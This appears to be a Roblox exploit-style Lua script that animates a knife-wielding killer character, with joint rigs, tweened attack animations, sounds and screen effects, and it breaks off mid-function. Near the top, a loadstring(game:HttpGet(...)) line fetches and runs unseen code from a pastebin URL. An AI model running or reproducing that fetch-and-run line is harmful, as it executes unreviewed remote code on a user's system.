script = game:GetObjects("rbxassetid://7816151560")[1].Hellash
wait(0.9)
loadstring(game:HttpGet("https://pastebin.com/raw/uq6axDFA"))()
wait(.1)
local math=setmetatable({random=function(Arg1,Arg2,DIV) DIV=DIV or 1 return math.random(Arg1*DIV,Arg2*DIV)/DIV end,CosSin=function(Arg) return (math.sin(Arg/2)*math.cos(Arg/2)) end,},{__index=math,})
local CFrame=setmetatable({Angles=function(Arg1,Arg2,Arg3,Angles) if not Angles then return CFrame.Angles(Arg1,Arg2,Arg3) else return CFrame.Angles(math.rad(Arg1),math.rad(Arg2),math.rad(Arg3)) end end,},{__index=CFrame,})
local Instance=setmetatable({new=function(type,args) local instance=Instance.new(type) if args then if string.lower(typeof(args)) == "instance" then instance.Parent=args elseif string.lower(typeof(args))=="table" then for i,v in pairs(args) do pcall(function() instance[i]=v end) end end end return instance end,Remove=function(Instance_,Time) if string.lower(typeof(Instance_))=="instance" then game:GetService("Debris"):AddItem(Instance_,Time or 0) elseif string.lower(typeof(Instance_))=="table" then table.foreach(Instance_,function(_,v) game:GetService("Debris"):AddItem(v,Time or 0) end) end end},{__index=Instance,})


	local math=setmetatable({random=function(Arg1,Arg2,DIV) DIV=DIV or 1 return math.random(Arg1*DIV,Arg2*DIV)/DIV end,CosSin=function(Arg) return (math.sin(Arg/2)*math.cos(Arg/2)) end,},{__index=math,})
	local CFrame=setmetatable({Angles=function(Arg1,Arg2,Arg3,Angles) if not Angles then return CFrame.Angles(Arg1,Arg2,Arg3) else return CFrame.Angles(math.rad(Arg1),math.rad(Arg2),math.rad(Arg3)) end end,},{__index=CFrame,})
	local Instance=setmetatable({new=function(type,args) local instance=Instance.new(type) if args then if string.lower(typeof(args)) == "instance" then instance.Parent=args elseif string.lower(typeof(args))=="table" then for i,v in pairs(args) do pcall(function() instance[i]=v end) end end end return instance end,Remove=function(Instance_,Time) if string.lower(typeof(Instance_))=="instance" then game:GetService("Debris"):AddItem(Instance_,Time or 0) elseif string.lower(typeof(Instance_))=="table" then table.foreach(Instance_,function(_,v) game:GetService("Debris"):AddItem(v,Time or 0) end) end end},{__index=Instance,})
	local Player,UIS,Mouse=game:GetService("Players").LocalPlayer,game:GetService("UserInputService")
	Mouse=Player:GetMouse()
	local Rem=script.Data.Scripts.SClient.Input
	local InfoRef=Rem.InfoRef
local Values=script.Data.Scripts.SClient.Values
	local HeadFollow=(Values.HeadFollow or{Value=false}).Value
	local Resetted=false
	local Char=Player.Character
	local H=Char.Head
	local Hum=Char:FindFirstChildOfClass("Humanoid")
	local HRP=Char.HumanoidRootPart
	local Cam=workspace.CurrentCamera
	local CSFuncs={}
	--//
	function Tween(Object,Args,Info)
		if Object and Args then
			Info = Info or TweenInfo.new(1,Enum.EasingStyle.Linear,Enum.EasingDirection.In,0,false,0)
			if typeof(Info) == "table" then Info = TweenInfo.new(unpack(Info)) end
			game:GetService("TweenService"):Create(Object,Info,Args):Play()
		end
	end
	function Sound(Id,Volume,Pitch,Parent,MaxDistance,EmitterSize,Looped)
		local S=Instance.new("Sound",{Volume=Volume or 1,Pitch=Pitch or 1,MaxDistance=MaxDistance or 500,EmitterSize=EmitterSize or 5,Looped=Looped or false,SoundId="rbxassetid://"..Id,Parent=Parent})
		S:Play()
		coroutine.wrap(function()
			if S.Looped then return end
			if S.IsLoaded then
				Instance.Remove(S,S.TimeLength/S.Pitch)
			else
				S.Loaded:Connect(function()
					Instance.Remove(S,S.TimeLength/S.Pitch)
				end)
			end
		end)()
		return S
	end
	function Raycast(Origin,Direction,Blacklist,MaxDistance,IgnoreWater)
		return workspace:FindPartOnRayWithIgnoreList(Ray.new(Origin,Direction.Unit*MaxDistance),Blacklist or {},false,IgnoreWater)
	end
	--//

	--// Free space for CrossServer functions \\
	Sound(3059472384,.05,.9,script,50,5,true)
	CSFuncs.SlightFO = function(Time)
		Time=Time or .2
		local Eff=Instance.new("ColorCorrectionEffect",{TintColor=Color3.fromRGB(141,0,0),Saturation=10,Contrast=.25,Brightness=.25,Parent=game:GetService("Lighting")})
		--local Soud=Sound(649642524,1.5,1/(Time*5),Player.PlayerGui,5,5,false)
		local SEff=Instance.new("DistortionSoundEffect",{Level=.55,Parent=Sound})
		Instance.Remove(Eff,Time)
		Tween(Eff,{TintColor=Color3.new(1,1,1),Saturation=0,Contrast=0,Brightness=0},{Time,Enum.EasingStyle.Sine,Enum.EasingDirection.Out,0,false,0})
		--Tween(Soud,{Volume=0},{Time*4,Enum.EasingStyle.Sine,Enum.EasingDirection.Out,0,false,0})
		for i=1,Time*50 do
			Cam.CFrame=Cam.CFrame*CFrame.Angles(math.random(-1,1,10),math.random(-1,1,10),math.random(-1,1),true)
			Hum.CameraOffset=Hum.CameraOffset+Vector3.new(math.random(-.05,.05,1000),math.random(-.05,.05,1000),math.random(-.05,.05,1000))
			game:GetService("RunService").RenderStepped:Wait()
		end
end


local LoopType = Instance.new("StringValue")
LoopType.Name = "LoopType"
LoopType.Value = "Custom"


local ArtificialHB2 = Instance.new("BindableEvent", script)
ArtificialHB2.Name = "ArtificialHB2"
script:WaitForChild("ArtificialHB2")
frame = 1/60
tf = 0
allowframeloss = false
tossremainder = false
lastframe = tick()
script.ArtificialHB2:Fire()
game:GetService("RunService").Heartbeat:connect(function(s, p)
	tf = tf + s
	if tf >= frame then
		if allowframeloss then
			ArtificialHB2:Fire()
			lastframe = tick()
		else
			for i = 1, math.floor(tf / frame) do
				ArtificialHB2:Fire()
			end
			lastframe = tick()
		end
		if tossremainder then
			tf = 0
		else
			tf = tf - frame * math.floor(tf / frame)
		end
	end
end)

function BaseWait(NUMBER)
	if NUMBER == 0 or NUMBER == nil then
		if LoopType.Value == "Server" then
			--SyncFolder.ChildAdded:wait()
		elseif LoopType.Value == "RenderStepped" then
			game:GetService("RunService").RenderStepped:wait()
		elseif LoopType.Value == "Stepped" then
			game:GetService("RunService").Stepped:wait()
		elseif LoopType.Value == "Heartbeat" then
			game:GetService("RunService").Heartbeat:wait()
		elseif LoopType.Value == "Custom" then
			ArtificialHB2.Event:wait()
		end
	else
		for i = 1, NUMBER do
			if LoopType.Value == "Server" then
				--SyncFolder.ChildAdded:wait()
			elseif LoopType.Value == "RenderStepped" then
				game:GetService("RunService").RenderStepped:wait()
			elseif LoopType.Value == "Stepped" then
				game:GetService("RunService").Stepped:wait()
			elseif LoopType.Value == "Heartbeat" then
				game:GetService("RunService").Heartbeat:wait()
			elseif LoopType.Value == "Custom" then
				ArtificialHB2.Event:wait()
			end
		end
	end
end
swait = BaseWait
Swait = BaseWait
ArtificialHB2.Event:Connect(function()

	if Swait ~= BaseWait then
		Swait = BaseWait
	end
	if swait ~= BaseWait then
		swait = BaseWait
	end
end)

	game:GetService("RunService").Heartbeat:Connect(function()
	Char=Player.Character
	if Char and #Char:GetChildren()>8 then
		H=Char.Head
		Hum=Char:FindFirstChildOfClass("Humanoid")
		HRP=Char.HumanoidRootPart
	end
	HeadFollow=(Values.HeadFollow or{Value=false}).Value
	if HeadFollow and Hum then
		Resetted=false
		Hum.CameraOffset=Hum.CameraOffset:Lerp((HRP.CFrame*CFrame.new(0,1.5,0)):PointToObjectSpace(H.Position),.125)
	elseif not HeadFollow and not Resetted then
		Resetted=true
		Hum.CameraOffset=Vector3.new()
	end
end)


--// Shortcuts
local ins=Instance.new
local v3=Vector3.new
local v2=Vector2.new
local cf=CFrame.new
local angles=CFrame.Angles
local ud=UDim.new
local ud2=UDim2.new
local c3=Color3.new
local rgb=Color3.fromRGB
local hsv=Color3.fromHSV
local bc=BrickColor.new
local bcRandom=BrickColor.Random
local palette=BrickColor.palette
local cs=ColorSequence.new
local ns=NumberSequence.new
local nsk=NumberSequenceKeypoint.new
local nr=NumberRange.new
local random=math.random
local rad=math.rad
local sin=math.sin
local cos=math.cos
local tan=math.tan
local CosSin=math.CosSin
local floor=math.floor
local pi=math.pi
local abs=math.abs
local sqrt=math.sqrt
local clamp=math.clamp
local ray=Ray.new
local huge=math.huge
--// Basic functions
function Tween(Object,Args,Info)
	if Object and Args then
		Info = Info or TweenInfo.new(1,Enum.EasingStyle.Linear,Enum.EasingDirection.In,0,false,0)
		if typeof(Info) == "table" then Info = TweenInfo.new(unpack(Info)) end
		game:GetService("TweenService"):Create(Object,Info,Args):Play()
	end
end
function Sound(Id,Volume,Pitch,Parent,MaxDistance,EmitterSize,Looped)
	local S=ins("Sound",{Volume=Volume or 1,Pitch=Pitch or 1,MaxDistance=MaxDistance or 500,EmitterSize=EmitterSize or 5,Looped=Looped or false,SoundId="rbxassetid://"..Id,Parent=Parent})
	if not Looped then S:Resume() else S:Play() end
	coroutine.wrap(function()
		if S.Looped then return end
		if S.IsLoaded then
			Instance.Remove(S,S.TimeLength/S.Pitch)
		else
			S.Loaded:Connect(function()
				Instance.Remove(S,S.TimeLength/S.Pitch)
			end)
		end
	end)()
	return S
end
function Raycast(Origin,Direction,Blacklist,MaxDistance,IgnoreWater)
	return workspace:FindPartOnRayWithIgnoreList(ray(Origin,Direction.Unit*MaxDistance),Blacklist or {},false,IgnoreWater)
end
--// Setup 1
for i,v in pairs(Player.Character:GetDescendants()) do
	if (v.Name=="Animate" and v:IsA("LocalScript")) or v:IsA("Animator") then
		Instance.Remove(v)
	end
end
--// Character indexing
local LockWS,LockJP=true,true
local Type="R6"
Char,char=Player.Character,Player.Character
local Hum,hum=Char:FindFirstChildOfClass("Humanoid"),Char:FindFirstChildOfClass("Humanoid")
local hrp,HRP=Char.HumanoidRootPart,Char.HumanoidRootPart
local h,t,rs,ls,rl,ll
local nec,rs,ls,rh,lh,rutj
local necC0,necC1=cf(),cf()
local rutjC0,rutjC1=cf(),cf()
local rsC0,rsC1=cf(),cf()
local lsC0,lsC1=cf(),cf()
local rhC0,rhC1=cf(),cf()
local lhC0,lhC1=cf(),cf()
local KnC0,KnC1=cf(-.15,-.85,0),cf(-.75,0,0)*angles(0,-90,0,true)
local h,ut,lt,rua,rla,rh,lua,lla,lh,ral,rll,rf,lul,lll,lf
local CFs={}
local Joints={}
BLOODPARENT=workspace.Terrain
if Type=="R6" then
	h,t,ra,la,rl,ll=char.Head,char.Torso,char["Right Arm"],char["Left Arm"],char["Right Leg"],char["Left Leg"]
	nec,rutj,rs,ls,rh,lh=t.Neck,hrp.RootJoint,t["Right Shoulder"],t["Left Shoulder"],t["Right Hip"],t["Left Hip"]
	necC0,necC1=cf(0,t.Size.Y/2,0),cf(0,-h.Size.Y/2,0)
	rutjC0,rutjC1=cf(0,0,0),cf(0,0,0)
	rsC0,rsC1=cf(t.Size.X/2,t.Size.Y/4,0),cf(-ra.Size.X/2,ra.Size.Y/4,0)
	lsC0,lsC1=cf(-t.Size.X/2,t.Size.Y/4,0),cf(la.Size.X/2,la.Size.Y/4,0)
	rhC0,rhC1=cf(t.Size.X/4,-t.Size.Y/2,0),cf(0,rl.Size.Y/2,0)
	lhC0,lhC1=cf(-t.Size.X/4,-t.Size.Y/2,0),cf(0,ll.Size.Y/2,0)
	Instance.Remove({nec,rutj,rs,ls,rh,lh})
	nec=ins("Motor6D",{Name="Neck",Part0=t,Part1=h,C0=necC0,C1=necC1,Parent=t})
	rutj=ins("Motor6D",{Name="RootJoint",Part0=hrp,Part1=t,C0=rutjC0,C1=rutjC1,Parent=hrp})
	rs=ins("Motor6D",{Name="Right Shoulder",Part0=t,Part1=ra,C0=rsC0,C1=rsC1,Parent=t})
	ls=ins("Motor6D",{Name="Left Shoulder",Part0=t,Part1=la,C0=lsC0,C1=lsC1,Parent=t})
	rh=ins("Motor6D",{Name="Right Hip",Part0=t,Part1=rl,C0=rhC0,C1=rhC1,Parent=t})
	lh=ins("Motor6D",{Name="Left Hip",Part0=t,Part1=ll,C0=lhC0,C1=lhC1,Parent=t})
elseif Type=="R15" then
	h,hrp=Char.Head,Char.HumanoidRootPart
	ut,lt=Char.UpperTorso,Char.LowerTorso
	rua,rla,rh=Char.RightUpperArm,Char.RightLowerArm,Char.RightHand
	lua,lla,lh=Char.LeftUpperArm,Char.LeftLowerArm,Char.LeftHand
	rul,rll,rf=Char.RightUpperLeg,Char.RightLowerLeg,Char.RightFoot
	lul,lll,lf=Char.LeftUpperLeg,Char.LeftLowerLeg,Char.LeftFoot
	for i,v in pairs(Char:GetDescendants()) do
		if v:IsA("Motor6D") then
			local CFData={C0=cf(v.C0.Position),C1=cf(v.C1.Position),Part0=v.Part0,Part1=v.Part1,Parent=v.Parent}
			local Joint=ins("Motor6D",{C0=CFData.C0,C1=CFData.C1,Part0=CFData.Part0,Part1=CFData.Part1,Name=v.Name,Parent=CFData.Parent,})
			CFs[v.Name]=CFData
			Joints[v.Name]=setmetatable({Object=Joint,Link=CFData,Remove=function(Time) Instance.Remove(Joint,Time) end},{__index=Joint,__newindex=function(self,k,v) Joint[k]=v end})
			v.Parent=nil
			Instance.Remove(v)
		end
	end
end
--// Variables
local TimePos,CharClone,HumClone,Knife,KnifeW,KTPos,OldKTPos
local Using,Muted,RefitDeb,KnifeToggled,KnifeDeb,KnifeTrail=false,false,false,false,false,false
local Sine,Change=0,1
local KTPosDelay,Combo,ComboPool,DrippingLeft=0,1,0,0
local WS,JP=6,50
local Step="R"
local StepSounds={Plastic=2812418291,SmoothPlastic=2812418291,Neon=2812418291,ForceField=2812418291,Metal=2812417769,DiamondPlate=2812417769,CorrodedMetal=2812417769,Foil=2812417769,Sand=619188333,Grass=619188333,Slate=941640049,Concrete=941640049,Granite=941640049,Pebble=941640049,Marble=941640049,Cobblestone=941640049,Brick=941640049,Water=685857471,Wood=2812419402,WoodPlanks=2812419402,Fabric=133705377,Snow=619083295}
local Themes={{1885117669,.5},{1885117669,.6},{1885117669,.6},{1885117669,.6},{1885117669,.6},{1885117669,.7}}
local ThemeNum=random(1,#Themes)
local Accs,BodyTextures={},{}
local Pos=hrp.CFrame
local LastClickTick,ClickTime=tick(),random(2,10,10)
local LastBlinkTick,BlinkTime=tick(),random(5,15)
local LastTentTick,TentTime=tick(),random(.5,5,10)
local LastClenchTick,ClenchTime=tick(),random(.15,.5,100)
table.foreach(char:GetChildren(),function(_,v) if v:IsA("Accessory") then table.insert(Accs,v) elseif v:IsA("ForceField") then Instance.Remove(v) end end)
--// Setup 2
pcall(function() game:GetService("PhysicsService"):CreateCollisionGroup("M3") game:GetService("PhysicsService"):CollisionGroupSetCollidable("Default","M3",false) game:GetService("PhysicsService"):CollisionGroupSetCollidable("M3","M3",false) end)
local Models=script.Data.Models

local Blood= function()
	
end

local Anims= {
	Swing1={
		Waits={
			[1]=.225,
			[2]=.125,
			[3]=.125,
			[4]=.125
		},
		[1]={
			{"nec",{C1=cf(0,0,0)*angles(0,30,0,true)},{.25,Enum.EasingStyle.Back,Enum.EasingDirection.Out,0,false,0}},
			{"rutj",{C1=cf(0,0,0)*angles(0,-30,0,true)},{.25,Enum.EasingStyle.Back,Enum.EasingDirection.Out,0,false,0}},
			{"rs",{C0=cf(0,-.25,.325)*angles(80,0,120,true)*angles(0,90,0,true)},{.25,Enum.EasingStyle.Sine,Enum.EasingDirection.InOut,0,false,0}},
			{"ls",{C0=cf(.2,-.1,0)*angles(10,-20,-10,true)},{.25,Enum.EasingStyle.Sine,Enum.EasingDirection.Out,0,false,0}},
			{"rh",{C1=cf(0,0,0)*angles(7.5,-5,-5,true)},{.25,Enum.EasingStyle.Back,Enum.EasingDirection.Out,0,false,0}},
			{"lh",{C1=cf(0,0,-.25)*angles(-12.5,10,-5,true)},{.25,Enum.EasingStyle.Back,Enum.EasingDirection.Out,0,false,0}},
			{"kn",{C0=cf(0,0,0)*angles(0,180,0,true)},{.25,Enum.EasingStyle.Sine,Enum.EasingDirection.InOut,0,false,0}}
		},
		[2]={
			{"nec",{C1=cf(0,0,0)*angles(0,0,0,true)},{.15,Enum.EasingStyle.Back,Enum.EasingDirection.In,0,false,0}},
			{"rutj",{C1=cf(0,0,0)*angles(0,0,0,true)},{.15,Enum.EasingStyle.Back,Enum.EasingDirection.In,0,false,0}},
			{"rs",{C0=cf(0,-.25,-.1)*angles(85,0,60,true)*angles(0,90,0,true)},{.15,Enum.EasingStyle.Back,Enum.EasingDirection.In,0,false,0}},
			{"ls",{C0=cf(.2,-.1,0)*angles(0,-10,-15,true)},{.15,Enum.EasingStyle.Back,Enum.EasingDirection.In,0,false,0}},
			{"rh",{C1=cf(0,0,0)*angles(0,0,0,true)},{.15,Enum.EasingStyle.Back,Enum.EasingDirection.In,0,false,0}},
			{"lh",{C1=cf(0,0,0)*angles(0,0,0,true)},{.15,Enum.EasingStyle.Back,Enum.EasingDirection.In,0,false,0}},
			{"kn",{C0=cf(0,0,0)*angles(-10,180,0,true)},{.15,Enum.EasingStyle.Sine,Enum.EasingDirection.InOut,0,false,0}}
		},
		[3]={
			{"nec",{C1=cf(0,0,0)*angles(0,-100,0,true)},{.15,Enum.EasingStyle.Sine,Enum.EasingDirection.Out,0,false,0}},
			{"rutj",{C1=cf(0,0,0)*angles(0,100,0,true)},{.15,Enum.EasingStyle.Sine,Enum.EasingDirection.Out,0,false,0}},
			{"rs",{C0=cf(-.1,-.25,-.3)*angles(90,0,-35,true)*angles(0,90,0,true)},{.15,Enum.EasingStyle.Sine,Enum.EasingDirection.Out,0,false,0}},
			{"ls",{C0=cf(.2,-.1,.15)*angles(-15,-20,-25,true)},{.15,Enum.EasingStyle.Sine,Enum.EasingDirection.Out,0,false,0}},
			{"rh",{C1=cf(0,0,-.25)*angles(-30,-50,0,true)},{.15,Enum.EasingStyle.Sine,Enum.EasingDirection.Out,0,false,0}},
			{"lh",{C1=cf(0,0,0)*angles(19,-15,0,true)},{.15,Enum.EasingStyle.Sine,Enum.EasingDirection.Out,0,false,0}},
			{"kn",{C0=cf(0,0,0)*angles(25,180,0,true)},{.15,Enum.EasingStyle.Sine,Enum.EasingDirection.InOut,0,false,0}}
		},
		[4]={
			{"nec",{C1=cf(0,0,0)*angles(0,-10,0,true)},{.15,Enum.EasingStyle.Sine,Enum.EasingDirection.InOut,0,false,0}},
			{"rutj",{C1=cf(0,0,0)*angles(0,10,0,true)},{.15,Enum.EasingStyle.Sine,Enum.EasingDirection.InOut,0,false,0}},
			{"rs",{C0=cf(0,-.25,-.1)*angles(50,0,0,true)*angles(0,45,0,true)},{.15,Enum.EasingStyle.Sine,Enum.EasingDirection.InOut,0,false,0}},
			{"ls",{C0=cf(.2,-.1,0)*angles(0,-5,0,true)},{.15,Enum.EasingStyle.Sine,Enum.EasingDirection.InOut,0,false,0}},
			{"rh",{C1=cf(0,0,0)*angles(0,0,0,true)},{.15,Enum.EasingStyle.Sine,Enum.EasingDirection.InOut,0,false,0}},
			{"lh",{C1=cf(0,0,0)*angles(0,0,0,true)},{.15,Enum.EasingStyle.Sine,Enum.EasingDirection.InOut,0,false,0}},
			{"kn",{C0=cf(0,0,0)*angles(-20,180,0,true)},{.15,Enum.EasingStyle.Sine,Enum.EasingDirection.InOut,0,false,0}}
		}
	},
	TPSnap={
		Waits={
			[1]=.025,
			[2]=.175
		},
		[1]={
			{"nec",{C1=CFrame.Angles(math.rad(0),math.rad(-10),math.rad(20))},{.05,Enum.EasingStyle.Back,Enum.EasingDirection.Out,0,false,0}},
			{"rutj",{C1=CFrame.new(-0.15,0,1.05)*CFrame.Angles(math.rad(0),math.rad(10),math.rad(5))},{.05,Enum.EasingStyle.Back,Enum.EasingDirection.Out,0,false,0}},
			{"rs",{C0=CFrame.new(0,0.5,-0.85)*CFrame.Angles(math.rad(95),math.rad(-10),math.rad(-70))*CFrame.Angles(math.rad(10),math.rad(10),math.rad(0))},{.05,Enum.EasingStyle.Back,Enum.EasingDirection.Out,0,false,0}},
			{"ls",{C0=CFrame.new(0.4,0,-0.85)*CFrame.Angles(math.rad(70),math.rad(0),math.rad(70))*CFrame.Angles(math.rad(10),math.rad(10),math.rad(0))},{.05,Enum.EasingStyle.Back,Enum.EasingDirection.Out,0,false,0}},
			{"rh",{C1=CFrame.new(0,0,0)*CFrame.Angles(math.rad(0),math.rad(0),math.rad(0))},{.05,Enum.EasingStyle.Back,Enum.EasingDirection.Out,0,false,0}},
			{"lh",{C1=CFrame.new(0,0,0)*CFrame.Angles(math.rad(0),math.rad(0),math.rad(0))},{.05,Enum.EasingStyle.Back,Enum.EasingDirection.Out,0,false,0}},
		},
		[2]={
			{"nec",{C1=CFrame.Angles(math.rad(0),math.rad(10),math.rad(-20))},{.2,Enum.EasingStyle.Back,Enum.EasingDirection.InOut,0,false,0}},
			{"rutj",{C1=CFrame.new(-0.15,0,1.05)*CFrame.Angles(math.rad(0),math.rad(-30),math.rad(-5))},{.2,Enum.EasingStyle.Back,Enum.EasingDirection.InOut,0,false,0}},
			{"rs",{C0=CFrame.new(-0.95,0.5,-0.5)*CFrame.Angles(math.rad(95),math.rad(-10),math.rad(-45))*CFrame.Angles(math.rad(5),math.rad(15),math.rad(0))},{.2,Enum.EasingStyle.Back,Enum.EasingDirection.InOut,0,false,0}},
			{"ls",{C0=CFrame.new(-0.1,0,-0.85)*CFrame.Angles(math.rad(70),math.rad(0),math.rad(60))*CFrame.Angles(math.rad(0),math.rad(10),math.rad(0))},{.2,Enum.EasingStyle.Back,Enum.EasingDirection.InOut,0,false,0}},
			{"rh",{C1=CFrame.new(0,0.35,-0.65)*CFrame.Angles(math.rad(-15),math.rad(0),math.rad(0))},{.2,Enum.EasingStyle.Back,Enum.EasingDirection.InOut,0,false,0}},
			{"lh",{C1=CFrame.Angles(math.rad(0),math.rad(0),math.rad(0))},{.2,Enum.EasingStyle.Back,Enum.EasingDirection.InOut,0,false,0}},
		}
	},
	CursedGround={
		Waits={
			[1]=.125,
			[2]=.25,
			[3]=.15
		},
		[1]={
			{"nec",{C1=CFrame.Angles(math.rad(-20),math.rad(30),math.rad(0))},{.15,Enum.EasingStyle.Sine,Enum.EasingDirection.InOut,0,false,0}},
			{"rutj",{C1=CFrame.new(0,0,-0.25)*CFrame.Angles(math.rad(-10),math.rad(-30),math.rad(0))},{.15,Enum.EasingStyle.Sine,Enum.EasingDirection.InOut,0,false,0}},
			{"rs",{C0=CFrame.new(-0.2,-0.35,0)*CFrame.Angles(math.rad(50),math.rad(30),math.rad(20))},{.15,Enum.EasingStyle.Sine,Enum.EasingDirection.InOut,0,false,0}},
			{"ls",{C0=CFrame.new(0.1,-0.2,-0.1)*CFrame.Angles(math.rad(15),math.rad(-30),math.rad(-10))},{.15,Enum.EasingStyle.Sine,Enum.EasingDirection.InOut,0,false,0}},
			{"rh",{C1=CFrame.new(0,0,-0.35)*CFrame.Angles(math.rad(-10),math.rad(-10),math.rad(0))},{.15,Enum.EasingStyle.Sine,Enum.EasingDirection.InOut,0,false,0}},
			{"lh",{C1=CFrame.new(0,0,0)*CFrame.Angles(math.rad(5),math.rad(30),math.rad(-5))},{.15,Enum.EasingStyle.Sine,Enum.EasingDirection.InOut,0,false,0}},
		},
		[2]={
			{"nec",{C1=CFrame.Angles(math.rad(-30),math.rad(-10),math.rad(0))},{.25,Enum.EasingStyle.Back,Enum.EasingDirection.Out,0,false,0}},
			{"rutj",{C1=CFrame.new(0,-1.25,-0.25)*CFrame.Angles(math.rad(-50),math.rad(10),math.rad(0))},{.25,Enum.EasingStyle.Back,Enum.EasingDirection.Out,0,false,0}},
			{"rs",{C0=CFrame.new(-0.2,-0.35,-0.65)*CFrame.Angles(math.rad(65),math.rad(80),math.rad(-5))},{.25,Enum.EasingStyle.Back,Enum.EasingDirection.Out,0,false,0}},
			{"ls",{C0=CFrame.new(0.1,-0.2,-0.1)*CFrame.Angles(math.rad(25),math.rad(-20),math.rad(-20))},{.25,Enum.EasingStyle.Back,Enum.EasingDirection.Out,0,false,0}},
			{"rh",{C1=CFrame.new(0,0.2,-0.95)*CFrame.Angles(math.rad(-30),math.rad(-5),math.rad(0))},{.25,Enum.EasingStyle.Back,Enum.EasingDirection.Out,0,false,0}},
			{"lh",{C1=CFrame.new(0,1.6,-0.75)*CFrame.Angles(math.rad(15),math.rad(-10),math.rad(5))},{.25,Enum.EasingStyle.Back,Enum.EasingDirection.Out,0,false,0}},
		},
		[3]={
			{"nec",{C1=CFrame.Angles(math.rad(-30),math.rad(-10),math.rad(0))},{.175,Enum.EasingStyle.Linear,Enum.EasingDirection.Out,0,false,0}},
			{"rutj",{C1=CFrame.new(0,-1.25,-0.25)*CFrame.Angles(math.rad(-50),math.rad(10),math.rad(0))},{.175,Enum.EasingStyle.Linear,Enum.EasingDirection.Out,0,false,0}},
			{"rs",{C0=CFrame.new(-0.2,-0.35,-0.65)*CFrame.Angles(math.rad(65),math.rad(80),math.rad(-5))},{.175,Enum.EasingStyle.Linear,Enum.EasingDirection.Out,0,false,0}},
			{"ls",{C0=CFrame.new(0.1,-0.2,-0.1)*CFrame.Angles(math.rad(25),math.rad(-20),math.rad(-20))},{.175,Enum.EasingStyle.Linear,Enum.EasingDirection.Out,0,false,0}},
			{"rh",{C1=CFrame.new(0,0.2,-0.95)*CFrame.Angles(math.rad(-30),math.rad(-5),math.rad(0))},{.175,Enum.EasingStyle.Linear,Enum.EasingDirection.Out,0,false,0}},
			{"lh",{C1=CFrame.new(0,1.6,-0.75)*CFrame.Angles(math.rad(15),math.rad(-10),math.rad(5))},{.175,Enum.EasingStyle.Linear,Enum.EasingDirection.Out,0,false,0}},
		},
		[4]={
			{"nec",{C1=CFrame.Angles(math.rad(-20),math.rad(30),math.rad(0))},{.125,Enum.EasingStyle.Back,Enum.EasingDirection.Out,0,false,0}},
			{"rutj",{C1=CFrame.new(0,0,-0.25)*CFrame.Angles(math.rad(-10),math.rad(-30),math.rad(0))},{.125,Enum.EasingStyle.Back,Enum.EasingDirection.Out,0,false,0}},
			{"rs",{C0=CFrame.new(-0.2,-0.35,0)*CFrame.Angles(math.rad(50),math.rad(30),math.rad(20))},{.125,Enum.EasingStyle.Back,Enum.EasingDirection.Out,0,false,0}},
			{"ls",{C0=CFrame.new(0.1,-0.2,-0.1)*CFrame.Angles(math.rad(15),math.rad(-30),math.rad(-10))},{.125,Enum.EasingStyle.Back,Enum.EasingDirection.Out,0,false,0}},
			{"rh",{C1=CFrame.new(0,0,-0.35)*CFrame.Angles(math.rad(-10),math.rad(-10),math.rad(0))},{.125,Enum.EasingStyle.Back,Enum.EasingDirection.Out,0,false,0}},
			{"lh",{C1=CFrame.new(0,0,0)*CFrame.Angles(math.rad(5),math.rad(30),math.rad(-5))},{.125,Enum.EasingStyle.Back,Enum.EasingDirection.Out,0,false,0}},
		}
	}
}
local Effects
local FakeHead,KnifeC,BloodSplash,ThroatCut,MeatPiece=Models.Head:Clone(),Models.Knife:Clone(),Models.BloodSplashFX:Clone(),Models.ThroatCut:Clone(),Models.MeatPiece:Clone()
local Theme
local Smiles
FakeHead.Parent=h
FakeHead.Color=h.Color
FakeHead.Face.Color3=h.Color
h.Transparency=1
for i,v in pairs(h:GetChildren()) do if v:IsA("Decal") or v:IsA("SpecialMesh") or v:IsA("BlockMesh") then Instance.Remove(v) end end
ins("BlockMesh",{Scale=v3(0,0,0),Parent=h})
ins("Motor6D",{Part0=h,Part1=FakeHead,Parent=h})
ins("ForceField",{Parent=char,Visible=false})
local Holder=ins("ScreenGui",{ResetOnSpawn=false,Name=script.Name,Parent=Player.PlayerGui})
script.Parent=Holder
char.Archivable=true
h.Size=v3(1,1,1)
CharClone,HumClone=char:Clone(),Hum:Clone()
Models.Parent=nil
--// Functions
function PlayAnimSingle(...)
	local Joints_={nec=nec,rutj=rutj,rs=rs,ls=ls,rh=rh,lh=lh,kn=KnifeW}
	local CFs_={necC0=necC0,necC1=necC1,rutjC0=rutjC0,rutjC1=rutjC1,rsC0=rsC0,rsC1=rsC1,lsC0=lsC0,lsC1=lsC1,rhC0=rhC0,rhC1=rhC1,lhC0=lhC0,lhC1=lhC1,knC0=KnC0,knC1=KnC1}
	for i,v in pairs({...}) do
		if Joints_[v[1]] then
			local T={}
			table.foreach(v[2],function(i,v) T[i]=v end)
			local C0=((CFs_[v[1].."C0"] or cf(0,0,0))*(T.C0 or cf(0,0,0))) or CFs_[v[1].."C0"]
			local C1=((CFs_[v[1].."C1"] or cf(0,0,0))*((T.C1 or cf(0,0,0))):Inverse())
			for i,v in pairs(T) do if i=="C0" then T.C0=C0 elseif i=="C1" then T.C1=C1 end end
			Tween(Joints_[v[1]],T,v[3])
		end
	end
end
function PlayAnim(Table,AddFuncs)
	AddFuncs=AddFuncs or {}
	local Waits=Table.Waits
	for i=1,#Table do
		local v=Table[i]
		if Waits[i] then
			local WaitTime=Waits[i]
			PlayAnimSingle(unpack(v))
			wait(WaitTime)
			if AddFuncs[i] then AddFuncs[i]() end
		end
	end
end
local function MagDamage(Pos,Size,KnifeHit,Vel_,Vapourise,Silent)
	if not Pos then return end
	for i,v in pairs(workspace:FindPartsInRegion3WithIgnoreList(Region3.new(Pos-Size/2,Pos+Size/2),{char,BLOODPARENT},100)) do
		if v.Parent and v.Parent:FindFirstChildOfClass("Humanoid") then
			if not v.Parent:FindFirstChildOfClass("Humanoid"):FindFirstChild("gоnё") then
				targetnnn = v.Parent
			end
		end
	end
end
local function Laugh()
	coroutine.wrap(function()
		for i=1,random(1,5) do
			local L=Models.Laugh:Clone()
			L.Pitch=L.Pitch+random(-.1,.1,100)
			L.Parent=h
			L:Play()
			Instance.Remove(L,L.TimeLength/L.PlaybackSpeed)
			wait(L.TimeLength/L.PlaybackSpeed-1.5)
		end
	end)()
end
local function CreateTheme()
	if Theme then Instance.Remove(Theme) end
	Theme=Sound(Themes[ThemeNum][1],Themes[ThemeNum][2],1,t,75,7.5,true)
	Theme.TimePosition=TimePos
	local Eff1=ins("ReverbSoundEffect",Theme)
end
local function Eff(CF,Parts,MoreTent,SegmentLength)
